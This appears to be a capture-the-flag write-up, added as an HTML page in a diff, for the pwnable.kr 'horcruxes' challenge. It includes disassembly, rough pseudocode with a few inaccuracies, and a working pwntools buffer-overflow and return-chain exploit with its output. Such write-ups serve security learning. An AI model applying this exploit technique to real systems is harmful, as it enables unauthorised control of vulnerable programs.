@@ -1,0 +1,475 @@
+<head>
+    <title>pwnable.kr - horcruxes writeup</title>
+</head>
+
+<body>
+    <p style="display: block; white-space: pre-wrap;">
+    So let's start with looking at some of the assembly:
+
+    <code style="display: block; white-space: pre-wrap;">
+        [snip]
+
+        0x0809ff6a &lt;+70&gt;:	call   0x80a0324 &lt;hint&gt;
+        0x0809ff6f &lt;+75&gt;:	call   0x80a0177 &lt;init_ABCDEFG&gt;
+        0x0809ff74 &lt;+80&gt;:	sub    $0xc,%esp
+        0x0809ff77 &lt;+83&gt;:	push   $0x0
+        0x0809ff79 &lt;+85&gt;:	call   0x809fc20 &lt;seccomp_init@plt&gt;
+        0x0809ff7e &lt;+90&gt;:	add    $0x10,%esp
+        0x0809ff81 &lt;+93&gt;:	mov    %eax,-0xc(%ebp)
+        0x0809ff84 &lt;+96&gt;:	push   $0x0
+        0x0809ff86 &lt;+98&gt;:	push   $0xad
+        0x0809ff8b &lt;+103&gt;:	push   $0x7fff0000
+        0x0809ff90 &lt;+108&gt;:	pushl  -0xc(%ebp)
+        0x0809ff93 &lt;+111&gt;:	call   0x809fc60 &lt;seccomp_rule_add@plt&gt;
+        0x0809ff98 &lt;+116&gt;:	add    $0x10,%esp
+        0x0809ff9b &lt;+119&gt;:	push   $0x0
+        0x0809ff9d &lt;+121&gt;:	push   $0x5
+        0x0809ff9f &lt;+123&gt;:	push   $0x7fff0000
+        0x0809ffa4 &lt;+128&gt;:	pushl  -0xc(%ebp)
+        0x0809ffa7 &lt;+131&gt;:	call   0x809fc60 &lt;seccomp_rule_add@plt&gt;
+        0x0809ffac &lt;+136&gt;:	add    $0x10,%esp
+        0x0809ffaf &lt;+139&gt;:	push   $0x0
+        0x0809ffb1 &lt;+141&gt;:	push   $0x3
+        0x0809ffb3 &lt;+143&gt;:	push   $0x7fff0000
+        0x0809ffb8 &lt;+148&gt;:	pushl  -0xc(%ebp)
+        0x0809ffbb &lt;+151&gt;:	call   0x809fc60 &lt;seccomp_rule_add@plt&gt;
+        0x0809ffc0 &lt;+156&gt;:	add    $0x10,%esp
+        0x0809ffc3 &lt;+159&gt;:	push   $0x0
+        ---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+        0x0809ffc5 &lt;+161&gt;:	push   $0x4
+        0x0809ffc7 &lt;+163&gt;:	push   $0x7fff0000
+        0x0809ffcc &lt;+168&gt;:	pushl  -0xc(%ebp)
+        0x0809ffcf &lt;+171&gt;:	call   0x809fc60 &lt;seccomp_rule_add@plt&gt;
+        0x0809ffd4 &lt;+176&gt;:	add    $0x10,%esp
+        0x0809ffd7 &lt;+179&gt;:	push   $0x0
+        0x0809ffd9 &lt;+181&gt;:	push   $0xfc
+        0x0809ffde &lt;+186&gt;:	push   $0x7fff0000
+        0x0809ffe3 &lt;+191&gt;:	pushl  -0xc(%ebp)
+        0x0809ffe6 &lt;+194&gt;:	call   0x809fc60 &lt;seccomp_rule_add@plt&gt;
+        0x0809ffeb &lt;+199&gt;:	add    $0x10,%esp
+        0x0809ffee &lt;+202&gt;:	sub    $0xc,%esp
+        0x0809fff1 &lt;+205&gt;:	pushl  -0xc(%ebp)
+        0x0809fff4 &lt;+208&gt;:	call   0x809fc80 &lt;seccomp_load@plt&gt;
+        0x0809fff9 &lt;+213&gt;:	add    $0x10,%esp
+        0x0809fffc &lt;+216&gt;:	call   0x80a0009 &lt;ropme&gt;
+        0x080a0001 &lt;+221&gt;:	mov    -0x4(%ebp),%ecx
+        0x080a0004 &lt;+224&gt;:	leave
+        0x080a0005 &lt;+225&gt;:	lea    -0x4(%ecx),%esp
+        0x080a0008 &lt;+228&gt;:	ret
+    </code>
+
+    So we start by calling the hint function. Let's disassemble it:
+
+    <code style="display: block; white-space: pre-wrap;">
+        yoray@b0x:  Downloads$ python htmlize.py 
+
+        Dump of assembler code for function hint:
+        0x080a0324 &lt;+0&gt;:	push   %ebp
+        0x080a0325 &lt;+1&gt;:	mov    %esp,%ebp
+        0x080a0327 &lt;+3&gt;:	sub    $0x8,%esp
+        0x080a032a &lt;+6&gt;:	sub    $0xc,%esp
+        0x080a032d &lt;+9&gt;:	push   $0x80a0598
+        0x080a0332 &lt;+14&gt;:	call   0x809fca0 &lt;puts@plt&gt;
+        0x080a0337 &lt;+19&gt;:	add    $0x10,%esp
+        0x080a033a &lt;+22&gt;:	sub    $0xc,%esp
+        0x080a033d &lt;+25&gt;:	push   $0x80a05d4
+        0x080a0342 &lt;+30&gt;:	call   0x809fca0 &lt;puts@plt&gt;
+        0x080a0347 &lt;+35&gt;:	add    $0x10,%esp
+        0x080a034a &lt;+38&gt;:	nop
+        0x080a034b &lt;+39&gt;:	leave  
+        0x080a034c &lt;+40&gt;:	ret    
+        End of assembler dump.
+        (gdb) x/s 0x80a0598
+        0x80a0598:	&quot;Voldemort concealed his splitted soul inside 7 horcruxes.&quot;
+        (gdb) x/s 0x80a05d4
+        0x80a05d4:	&quot;Find all horcruxes, and destroy it!
+        &quot;
+    </code>
+
+    Not a lot of hints. Let's diassemble the init_ABCDEFG function now: 
+
+    <code style="display: block; white-space: pre-wrap;">
+        0x080a0177 &lt;+0&gt;:	push   %ebp
+        0x080a0178 &lt;+1&gt;:	mov    %esp,%ebp
+        0x080a017a &lt;+3&gt;:	sub    $0x18,%esp
+        0x080a017d &lt;+6&gt;:	sub    $0x8,%esp
+        0x080a0180 &lt;+9&gt;:	push   $0x0
+        0x080a0182 &lt;+11&gt;:	push   $0x80a0577
+        0x080a0187 &lt;+16&gt;:	call   0x809fcc0 &lt;open@plt&gt;
+        0x080a018c &lt;+21&gt;:	add    $0x10,%esp
+        0x080a018f &lt;+24&gt;:	mov    %eax,-0xc(%ebp)
+        0x080a0192 &lt;+27&gt;:	sub    $0x4,%esp
+        0x080a0195 &lt;+30&gt;:	push   $0x4
+        0x080a0197 &lt;+32&gt;:	lea    -0x10(%ebp),%eax
+        0x080a019a &lt;+35&gt;:	push   %eax
+        0x080a019b &lt;+36&gt;:	pushl  -0xc(%ebp)
+        0x080a019e &lt;+39&gt;:	call   0x809fc30 &lt;read@plt&gt;
+        0x080a01a3 &lt;+44&gt;:	add    $0x10,%esp
+        0x080a01a6 &lt;+47&gt;:	cmp    $0x4,%eax
+        0x080a01a9 &lt;+50&gt;:	je     0x80a01c5 &lt;init_ABCDEFG+78&gt;
+        0x080a01ab &lt;+52&gt;:	sub    $0xc,%esp
+        0x080a01ae &lt;+55&gt;:	push   $0x80a0584
+        0x080a01b3 &lt;+60&gt;:	call   0x809fca0 &lt;puts@plt&gt;
+        0x080a01b8 &lt;+65&gt;:	add    $0x10,%esp
+        0x080a01bb &lt;+68&gt;:	sub    $0xc,%esp
+        0x080a01be &lt;+71&gt;:	push   $0x0
+        0x080a01c0 &lt;+73&gt;:	call   0x809fcb0 &lt;exit@plt&gt;
+        0x080a01c5 &lt;+78&gt;:	sub    $0xc,%esp
+        0x080a01c8 &lt;+81&gt;:	pushl  -0xc(%ebp)
+        0x080a01cb &lt;+84&gt;:	call   0x809fd30 &lt;close@plt&gt;
+        0x080a01d0 &lt;+89&gt;:	add    $0x10,%esp
+        0x080a01d3 &lt;+92&gt;:	mov    -0x10(%ebp),%eax
+        0x080a01d6 &lt;+95&gt;:	sub    $0xc,%esp
+        0x080a01d9 &lt;+98&gt;:	push   %eax
+        0x080a01da &lt;+99&gt;:	call   0x809fcd0 &lt;srand@plt&gt;
+        0x080a01df &lt;+104&gt;:	add    $0x10,%esp
+        0x080a01e2 &lt;+107&gt;:	call   0x809fd00 &lt;rand@plt&gt;
+        0x080a01e7 &lt;+112&gt;:	imul   $0xdeadbeef,%eax,%edx
+        0x080a01ed &lt;+118&gt;:	cmp    $0xcafebabe,%edx
+        0x080a01f3 &lt;+124&gt;:	setae  %al
+        0x080a01f6 &lt;+127&gt;:	movzbl %al,%eax
+        0x080a01f9 &lt;+130&gt;:	imul   $0xcafebabe,%eax,%eax
+        0x080a01ff &lt;+136&gt;:	sub    %eax,%edx
+        0x080a0201 &lt;+138&gt;:	mov    %edx,%eax
+        0x080a0203 &lt;+140&gt;:	mov    %eax,0x80a2088
+        0x080a0208 &lt;+145&gt;:	call   0x809fd00 &lt;rand@plt&gt;
+        0x080a020d &lt;+150&gt;:	imul   $0xdeadbeef,%eax,%edx
+        0x080a0213 &lt;+156&gt;:	cmp    $0xcafebabe,%edx
+        0x080a0219 &lt;+162&gt;:	setae  %al
+        0x080a021c &lt;+165&gt;:	movzbl %al,%eax
+        0x080a021f &lt;+168&gt;:	imul   $0xcafebabe,%eax,%eax
+        0x080a0225 &lt;+174&gt;:	sub    %eax,%edx
+        0x080a0227 &lt;+176&gt;:	mov    %edx,%eax
+        ---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+        0x080a0229 &lt;+178&gt;:	mov    %eax,0x80a2070
+        0x080a022e &lt;+183&gt;:	call   0x809fd00 &lt;rand@plt&gt;
+        0x080a0233 &lt;+188&gt;:	imul   $0xdeadbeef,%eax,%edx
+        0x080a0239 &lt;+194&gt;:	cmp    $0xcafebabe,%edx
+        0x080a023f &lt;+200&gt;:	setae  %al
+        0x080a0242 &lt;+203&gt;:	movzbl %al,%eax
+        0x080a0245 &lt;+206&gt;:	imul   $0xcafebabe,%eax,%eax
+        0x080a024b &lt;+212&gt;:	sub    %eax,%edx
+        0x080a024d &lt;+214&gt;:	mov    %edx,%eax
+        0x080a024f &lt;+216&gt;:	mov    %eax,0x80a2084
+        0x080a0254 &lt;+221&gt;:	call   0x809fd00 &lt;rand@plt&gt;
+        0x080a0259 &lt;+226&gt;:	imul   $0xdeadbeef,%eax,%edx
+        0x080a025f &lt;+232&gt;:	cmp    $0xcafebabe,%edx
+        0x080a0265 &lt;+238&gt;:	setae  %al
+        0x080a0268 &lt;+241&gt;:	movzbl %al,%eax
+        0x080a026b &lt;+244&gt;:	imul   $0xcafebabe,%eax,%eax
+        0x080a0271 &lt;+250&gt;:	sub    %eax,%edx
+        0x080a0273 &lt;+252&gt;:	mov    %edx,%eax
+        0x080a0275 &lt;+254&gt;:	mov    %eax,0x80a206c
+        0x080a027a &lt;+259&gt;:	call   0x809fd00 &lt;rand@plt&gt;
+        0x080a027f &lt;+264&gt;:	imul   $0xdeadbeef,%eax,%edx
+        0x080a0285 &lt;+270&gt;:	cmp    $0xcafebabe,%edx
+        0x080a028b &lt;+276&gt;:	setae  %al
+        0x080a028e &lt;+279&gt;:	movzbl %al,%eax
+        0x080a0291 &lt;+282&gt;:	imul   $0xcafebabe,%eax,%eax
+        0x080a0297 &lt;+288&gt;:	sub    %eax,%edx
+        0x080a0299 &lt;+290&gt;:	mov    %edx,%eax
+        0x080a029b &lt;+292&gt;:	mov    %eax,0x80a2080
+        0x080a02a0 &lt;+297&gt;:	call   0x809fd00 &lt;rand@plt&gt;
+        0x080a02a5 &lt;+302&gt;:	imul   $0xdeadbeef,%eax,%edx
+        0x080a02ab &lt;+308&gt;:	cmp    $0xcafebabe,%edx
+        0x080a02b1 &lt;+314&gt;:	setae  %al
+        0x080a02b4 &lt;+317&gt;:	movzbl %al,%eax
+        0x080a02b7 &lt;+320&gt;:	imul   $0xcafebabe,%eax,%eax
+        0x080a02bd &lt;+326&gt;:	sub    %eax,%edx
+        0x080a02bf &lt;+328&gt;:	mov    %edx,%eax
+        0x080a02c1 &lt;+330&gt;:	mov    %eax,0x80a2074
+        0x080a02c6 &lt;+335&gt;:	call   0x809fd00 &lt;rand@plt&gt;
+        0x080a02cb &lt;+340&gt;:	imul   $0xdeadbeef,%eax,%edx
+        0x080a02d1 &lt;+346&gt;:	cmp    $0xcafebabe,%edx
+        0x080a02d7 &lt;+352&gt;:	setae  %al
+        0x080a02da &lt;+355&gt;:	movzbl %al,%eax
+        0x080a02dd &lt;+358&gt;:	imul   $0xcafebabe,%eax,%eax
+        0x080a02e3 &lt;+364&gt;:	sub    %eax,%edx
+        0x080a02e5 &lt;+366&gt;:	mov    %edx,%eax
+        0x080a02e7 &lt;+368&gt;:	mov    %eax,0x80a207c
+        0x080a02ec &lt;+373&gt;:	mov    0x80a2088,%edx
+        0x080a02f2 &lt;+379&gt;:	mov    0x80a2070,%eax
+        0x080a02f7 &lt;+384&gt;:	add    %eax,%edx
+        0x080a02f9 &lt;+386&gt;:	mov    0x80a2084,%eax
+        0x080a02fe &lt;+391&gt;:	add    %eax,%edx
+        0x080a0300 &lt;+393&gt;:	mov    0x80a206c,%eax
+        ---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+        0x080a0305 &lt;+398&gt;:	add    %eax,%edx
+        0x080a0307 &lt;+400&gt;:	mov    0x80a2080,%eax
+        0x080a030c &lt;+405&gt;:	add    %eax,%edx
+        0x080a030e &lt;+407&gt;:	mov    0x80a2074,%eax
+        0x080a0313 &lt;+412&gt;:	add    %eax,%edx
+        0x080a0315 &lt;+414&gt;:	mov    0x80a207c,%eax
+        0x080a031a &lt;+419&gt;:	add    %edx,%eax
+        0x080a031c &lt;+421&gt;:	mov    %eax,0x80a2078
+        0x080a0321 &lt;+426&gt;:	nop
+        0x080a0322 &lt;+427&gt;:	leave  
+        0x080a0323 &lt;+428&gt;:	ret    
+        End of assembler dump.
+    </code>
+
+    I made some psuedocode for this:
+
+    <code style="display: block; white-space: pre-wrap;">
+        fp = open("/dev/urandom");
+
+        read(fp, randomBytes, 4);
+
+        if (error) {
+        printf("/dev/urandom error\n");
+        exit(0);
+        }
+
+        close("/dev/urandom");
+
+        srand(randomBytes);
+
+        x = rand();
+
+        var1 = 0xdeadbeef * x;
+
+        a = var1 % 0xcafebabe;
+        b = 0xdeadbeef * rand() % 0xdeadbeef;
+        ...
+        g = 0xdeadbeef * rand() % 0xdeadbeef;
+
+        return a + b + ... + f + 0xdeadbeef * g % 0xcafebabe;
+    </code>
+
+    Ok. Now, let's continue looking at main:
+
+    we call seccomp functions to allow syscalls, and then we call ropme:
+
+    <code style="display: block; white-space: pre-wrap;">
+        Dump of assembler code for function ropme:
+        0x080a0009 &lt;+0&gt;:	push   %ebp
+        0x080a000a &lt;+1&gt;:	mov    %esp,%ebp
+        0x080a000c &lt;+3&gt;:	sub    $0x78,%esp
+        0x080a000f &lt;+6&gt;:	sub    $0xc,%esp
+        0x080a0012 &lt;+9&gt;:	push   $0x80a050c
+        0x080a0017 &lt;+14&gt;:	call   0x809fc40 &lt;printf@plt&gt;
+        0x080a001c &lt;+19&gt;:	add    $0x10,%esp
+        0x080a001f &lt;+22&gt;:	sub    $0x8,%esp
+        0x080a0022 &lt;+25&gt;:	lea    -0x10(%ebp),%eax
+        0x080a0025 &lt;+28&gt;:	push   %eax
+        0x080a0026 &lt;+29&gt;:	push   $0x80a0519
+        0x080a002b &lt;+34&gt;:	call   0x809fd10 &lt;__isoc99_scanf@plt&gt;
+        0x080a0030 &lt;+39&gt;:	add    $0x10,%esp
+        0x080a0033 &lt;+42&gt;:	call   0x809fc70 &lt;getchar@plt&gt;
+        0x080a0038 &lt;+47&gt;:	mov    -0x10(%ebp),%edx
+        0x080a003b &lt;+50&gt;:	mov    0x80a2088,%eax
+        0x080a0040 &lt;+55&gt;:	cmp    %eax,%edx
+        0x080a0042 &lt;+57&gt;:	jne    0x80a004e &lt;ropme+69&gt;
+        0x080a0044 &lt;+59&gt;:	call   0x809fe4b &lt;A&gt;
+        0x080a0049 &lt;+64&gt;:	jmp    0x80a0170 &lt;ropme+359&gt;
+        0x080a004e &lt;+69&gt;:	mov    -0x10(%ebp),%edx
+        0x080a0051 &lt;+72&gt;:	mov    0x80a2070,%eax
+        0x080a0056 &lt;+77&gt;:	cmp    %eax,%edx
+        0x080a0058 &lt;+79&gt;:	jne    0x80a0064 &lt;ropme+91&gt;
+        0x080a005a &lt;+81&gt;:	call   0x809fe6a &lt;B&gt;
+        0x080a005f &lt;+86&gt;:	jmp    0x80a0170 &lt;ropme+359&gt;
+        0x080a0064 &lt;+91&gt;:	mov    -0x10(%ebp),%edx
+        0x080a0067 &lt;+94&gt;:	mov    0x80a2084,%eax
+        0x080a006c &lt;+99&gt;:	cmp    %eax,%edx
+        0x080a006e &lt;+101&gt;:	jne    0x80a007a &lt;ropme+113&gt;
+        0x080a0070 &lt;+103&gt;:	call   0x809fe89 &lt;C&gt;
+        0x080a0075 &lt;+108&gt;:	jmp    0x80a0170 &lt;ropme+359&gt;
+        0x080a007a &lt;+113&gt;:	mov    -0x10(%ebp),%edx
+        0x080a007d &lt;+116&gt;:	mov    0x80a206c,%eax
+        0x080a0082 &lt;+121&gt;:	cmp    %eax,%edx
+        0x080a0084 &lt;+123&gt;:	jne    0x80a0090 &lt;ropme+135&gt;
+        0x080a0086 &lt;+125&gt;:	call   0x809fea8 &lt;D&gt;
+        0x080a008b &lt;+130&gt;:	jmp    0x80a0170 &lt;ropme+359&gt;
+        0x080a0090 &lt;+135&gt;:	mov    -0x10(%ebp),%edx
+        0x080a0093 &lt;+138&gt;:	mov    0x80a2080,%eax
+        0x080a0098 &lt;+143&gt;:	cmp    %eax,%edx
+        0x080a009a &lt;+145&gt;:	jne    0x80a00a6 &lt;ropme+157&gt;
+        0x080a009c &lt;+147&gt;:	call   0x809fec7 &lt;E&gt;
+        0x080a00a1 &lt;+152&gt;:	jmp    0x80a0170 &lt;ropme+359&gt;
+        0x080a00a6 &lt;+157&gt;:	mov    -0x10(%ebp),%edx
+        0x080a00a9 &lt;+160&gt;:	mov    0x80a2074,%eax
+        0x080a00ae &lt;+165&gt;:	cmp    %eax,%edx
+        0x080a00b0 &lt;+167&gt;:	jne    0x80a00bc &lt;ropme+179&gt;
+        0x080a00b2 &lt;+169&gt;:	call   0x809fee6 &lt;F&gt;
+        0x080a00b7 &lt;+174&gt;:	jmp    0x80a0170 &lt;ropme+359&gt;
+        0x080a00bc &lt;+179&gt;:	mov    -0x10(%ebp),%edx
+        ---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit--- 
+        0x080a00bf &lt;+182&gt;:	mov    0x80a207c,%eax
+        0x080a00c4 &lt;+187&gt;:	cmp    %eax,%edx
+        0x080a00c6 &lt;+189&gt;:	jne    0x80a00d2 &lt;ropme+201&gt;
+        0x080a00c8 &lt;+191&gt;:	call   0x809ff05 &lt;G&gt;
+        0x080a00cd &lt;+196&gt;:	jmp    0x80a0170 &lt;ropme+359&gt;
+        0x080a00d2 &lt;+201&gt;:	sub    $0xc,%esp
+        0x080a00d5 &lt;+204&gt;:	push   $0x80a051c
+        0x080a00da &lt;+209&gt;:	call   0x809fc40 &lt;printf@plt&gt;
+        0x080a00df &lt;+214&gt;:	add    $0x10,%esp
+        0x080a00e2 &lt;+217&gt;:	sub    $0xc,%esp
+        0x080a00e5 &lt;+220&gt;:	lea    -0x74(%ebp),%eax
+        0x080a00e8 &lt;+223&gt;:	push   %eax
+        0x080a00e9 &lt;+224&gt;:	call   0x809fc50 &lt;gets@plt&gt;
+        0x080a00ee &lt;+229&gt;:	add    $0x10,%esp
+        0x080a00f1 &lt;+232&gt;:	sub    $0xc,%esp
+        0x080a00f4 &lt;+235&gt;:	lea    -0x74(%ebp),%eax
+        0x080a00f7 &lt;+238&gt;:	push   %eax
+        0x080a00f8 &lt;+239&gt;:	call   0x809fd20 &lt;atoi@plt&gt;
+        0x080a00fd &lt;+244&gt;:	add    $0x10,%esp
+        0x080a0100 &lt;+247&gt;:	mov    %eax,%edx
+        0x080a0102 &lt;+249&gt;:	mov    0x80a2078,%eax
+        0x080a0107 &lt;+254&gt;:	cmp    %eax,%edx
+        0x080a0109 &lt;+256&gt;:	jne    0x80a0160 &lt;ropme+343&gt;
+        0x080a010b &lt;+258&gt;:	sub    $0x8,%esp
+        0x080a010e &lt;+261&gt;:	push   $0x0
+        0x080a0110 &lt;+263&gt;:	push   $0x80a053c
+        0x080a0115 &lt;+268&gt;:	call   0x809fcc0 &lt;open@plt&gt;
+        0x080a011a &lt;+273&gt;:	add    $0x10,%esp
+        0x080a011d &lt;+276&gt;:	mov    %eax,-0xc(%ebp)
+        0x080a0120 &lt;+279&gt;:	sub    $0x4,%esp
+        0x080a0123 &lt;+282&gt;:	push   $0x64
+        0x080a0125 &lt;+284&gt;:	lea    -0x74(%ebp),%eax
+        0x080a0128 &lt;+287&gt;:	push   %eax
+        0x080a0129 &lt;+288&gt;:	pushl  -0xc(%ebp)
+        0x080a012c &lt;+291&gt;:	call   0x809fc30 &lt;read@plt&gt;
+        0x080a0131 &lt;+296&gt;:	add    $0x10,%esp
+        0x080a0134 &lt;+299&gt;:	movb   $0x0,-0x74(%ebp,%eax,1)
+        0x080a0139 &lt;+304&gt;:	sub    $0xc,%esp
+        0x080a013c &lt;+307&gt;:	lea    -0x74(%ebp),%eax
+        0x080a013f &lt;+310&gt;:	push   %eax
+        0x080a0140 &lt;+311&gt;:	call   0x809fca0 &lt;puts@plt&gt;
+        0x080a0145 &lt;+316&gt;:	add    $0x10,%esp
+        0x080a0148 &lt;+319&gt;:	sub    $0xc,%esp
+        0x080a014b &lt;+322&gt;:	pushl  -0xc(%ebp)
+        0x080a014e &lt;+325&gt;:	call   0x809fd30 &lt;close@plt&gt;
+        0x080a0153 &lt;+330&gt;:	add    $0x10,%esp
+        0x080a0156 &lt;+333&gt;:	sub    $0xc,%esp
+        0x080a0159 &lt;+336&gt;:	push   $0x0
+        0x080a015b &lt;+338&gt;:	call   0x809fcb0 &lt;exit@plt&gt;
+        0x080a0160 &lt;+343&gt;:	sub    $0xc,%esp
+        0x080a0163 &lt;+346&gt;:	push   $0x80a0544
+        0x080a0168 &lt;+351&gt;:	call   0x809fca0 &lt;puts@plt&gt;
+        ---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
+        0x080a016d &lt;+356&gt;:	add    $0x10,%esp
+        0x080a0170 &lt;+359&gt;:	mov    $0x0,%eax
+        0x080a0175 &lt;+364&gt;:	leave  
+        0x080a0176 &lt;+365&gt;:	ret    
+        End of assembler dump.
+    </code>
+
+    Iv'e made psuedocode for this:
+
+    <code style="display: block; white-space: pre-wrap;">
+        int selection;
+        char buf[100];
+
+        printf("Select Menu:");
+        scanf("%d", &amp;buf);
+
+        if (selection == 'a') {
+        A();
+        }
+        ...
+        else if (selection == 'g') {
+        G();
+        }
+
+        else {
+        printf("How much EXP did you earned? : ");
+        gets(buf);
+
+        if (atoi(buf) == init_ABCDEFG) {
+        getflag;
+        }
+
+        puts("...");
+        }
+    </code>
+
+    So there's a buffer overflow when using gets. We can use that to call all of the A,...,F horcrux functions. Let's write an exploit:
+
+    <code style="display: block; white-space: pre-wrap;">
+        from pwn import *
+        import re
+
+        r = remote("0", 9032)
+
+        print r.recvuntil("Select Menu:")
+        r.sendline("123")
+
+        print r.recvuntil("earned? : ")
+
+        a = p32(0x809fe4b)
+        b = p32(0x809fe6a)
+        c = p32(0x809fe89)
+        d = p32(0x809fea8)
+        e = p32(0x809fec7)
+        f = p32(0x809fee6)
+        g = p32(0x809ff05)
+
+        call_ropme_instruction = p32(0x0809fffc)
+
+        r.send("A" * 0x74 + "BBBB")
+
+        r.sendline(a + b + c + d + e + f + g + call_ropme_instruction)
+
+        horcruxes = r.recvuntil("Select Menu:")
+
+        print horcruxes
+
+        horcruxes = horcruxes.strip().split("\n")
+
+        exps = [h for h in horcruxes if "EXP" in h]
+
+        rs = re.compile("^\d+$")
+
+        s = 0
+
+        for exp in exps:
+        if "+-" in exp:
+        s -= int(re.findall(r"\d+", exp)[0]) &amp; 0xffffffff
+        else:
+        s += int(re.findall(r"\d+", exp)[0]) &amp; 0xffffffff
+        print("[DEBUG] ", s)
+
+        s &amp;= 0xffffffff
+
+        print("sum=", s)
+
+        r.sendline("123")
+        r.recvuntil("earned? : ")
+        r.sendline(str(s))
+        r.interactive()
+    </code>
+
+    So we add all the horcruxes we find to the sum, and then send it as the exp we earned. Now, s is equal to the sum in the init_ABCDEFG, So we get the flag:
+
+    <code style="display: block; white-space: pre-wrap;">
+        Voldemort concealed his splitted soul inside 7 horcruxes.
+        Find all horcruxes, and destroy it!
+
+        Select Menu:
+        How many EXP did you earned? :
+        You'd better get more experience to kill Voldemort
+        You found "Tom Riddle's Diary" (EXP +-1830779413)
+        You found "Marvolo Gaunt's Ring" (EXP +824566066)
+        You found "Helga Hufflepuff's Cup" (EXP +899392537)
+        You found "Salazar Slytherin's Locket" (EXP +2077153202)
+        You found "Rowena Ravenclaw's Diadem" (EXP +78222986)
+        You found "Nagini the Snake" (EXP +1870655129)
+        You found "Harry Potter" (EXP +472949308)
+        Select Menu:
+        [DEBUG]  -1830779413
+        [DEBUG]  -1006213347
+        [DEBUG]  -106820810
+        [DEBUG]  1970332392
+        [DEBUG]  2048555378
+        [DEBUG]  3919210507
+        [DEBUG]  4392159815
+        ('sum=', 97192519)
+        [*] Switching to interactive mode
+        ***************************
+    </code>
+
+    Nice we got it!
+
+    EOF
+    </p>
+</body>
